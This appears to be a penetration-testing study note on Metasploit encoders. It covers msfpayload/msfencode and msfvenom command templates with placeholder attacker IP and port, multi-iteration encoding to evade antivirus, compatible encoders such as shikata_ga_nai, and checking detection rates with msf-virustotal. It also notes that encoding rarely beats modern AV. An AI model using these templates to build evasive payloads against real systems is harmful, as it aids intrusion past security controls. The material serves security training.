# Metasploit Encoders

## Purpose and Functionality

**Encoders** are used to modify payloads for compatibility and to bypass security controls. They serve three primary functions:

- **Architecture Compatibility:** Ensuring payloads run on different processor architectures such as **x64**, **x86**, **sparc**, **ppc**, and **mips**.
- **Bad Character Removal:** Stripping hexadecimal opcodes (bad characters) that might cause a payload to fail during execution.
- **AV Evasion:** Changing the payload signature to bypass Antivirus (AV) and IPS/IDS detection, though this effectiveness has significantly diminished as security software now utilizes more advanced signature detection,.

## Evolution of Encoding Tools

|Era|Tools Used|Description|
|:--|:--|:--|
|**Pre-2015**|`msfpayload` & `msfencode`|Separate submodules located in `/usr/share/framework2/` that required piping output from the generator to the encoder.|
|**Post-2015**|`msfvenom`|A unified tool that combines payload generation and encoding into a single command.|

---

## Operational Workflows

### 1. Generating Encoded Payloads (Legacy)

Use this workflow when working with older versions of the Metasploit Framework where generation and encoding are separate.

1. **Generate** the raw payload using `msfpayload`.
2. **Pipe** the output to `msfencode`.
3. **Specify** the bad characters to avoid and the desired output format.

```
msfpayload <PAYLOAD> LHOST=<ATTACK_IP> LPORT=<PORT> R | msfencode -b '<BAD_CHARS>' -f <FORMAT> -e <ENCODER>
```

### 2. Generating Encoded Payloads (Modern)

Use `msfvenom` for a streamlined process in modern environments.

1. **Select** the payload, architecture, and platform.
2. **Identify** bad characters to be automatically filtered.
3. **Apply** a specific encoder if required, or let the tool choose a compatible one,.

**Command: Standard Generation without explicit Encoder selection**

```
msfvenom -a <ARCH> --platform <PLATFORM> -p <PAYLOAD> LHOST=<ATTACK_IP> LPORT=<PORT> -b "<BAD_CHARS>" -f <FORMAT>
```

**Command: Manual Encoder selection**

```
msfvenom -a <ARCH> --platform <PLATFORM> -p <PAYLOAD> LHOST=<ATTACK_IP> LPORT=<PORT> -b "<BAD_CHARS>" -f <FORMAT> -e <ENCODER>
```

### 3. Increasing Evasion via Iterations

Use multiple iterations to further wrap the payload in encoding layers, though this rarely bypasses modern AV,.

1. Add the `-i` flag followed by the number of desired passes.
2. Note that each iteration increases the final payload size.

```
msfvenom -a <ARCH> --platform <PLATFORM> -p <PAYLOAD> LHOST=<ATTACK_IP> LPORT=<PORT> -e <ENCODER> -f <FORMAT> -i <ITERATION_COUNT> -o <OUTPUT_FILE>
```

---

## Encoder Selection and Compatibility

Techniques for finding the right encoder for a specific exploit/payload combination.

### Selecting an Encoder in msfconsole

When inside an exploit module, use the `show encoders` command to view only the encoders compatible with your current **Exploit module + Payload** combination,.

|Common Encoders|Rank|Description|
|:--|:--|:--|
|`x86/shikata_ga_nai`|**Excellent**|Polymorphic XOR Additive Feedback Encoder; historically the most utilized,.|
|`x64/zutto_dekiru`|Manual|x64-specific encoder.|
|`x86/alpha_mixed`|Low|Alphanumeric Mixedcase Encoder.|
|`generic/none`|Normal|The "none" Encoder (no encoding applied).|

---

## Analysis and Detection

Attackers must verify if their encoding is effective before deployment.

### Analyzing with msf-virustotal

Use this tool to check payload detection rates across multiple AV engines without manual uploads. **Requires a VirusTotal API key**.

```
msf-virustotal -k <API_KEY> -f <PAYLOAD_FILE>
```

### Attack Implications and Limitations

- **Shikata Ga Nai (SGN) Detection:** While SGN was once "undetectable," modern detection methods easily catch it even after 10 iterations,.
- **Signature-Based Block:** Most AV engines (e.g., Microsoft, Kaspersky, BitDefender) will flag SGN-encoded shells as malicious based on known signatures,.
- **Failure Condition:** Ensure you have write permissions to the destination directory; otherwise, `msfvenom` will return a **Permission denied** error when attempting to save the payload.
- **Final Assessment:** Encoders are primarily useful for architecture compatibility and removing bad characters; they are **not** a reliable standalone solution for modern AV evasion,.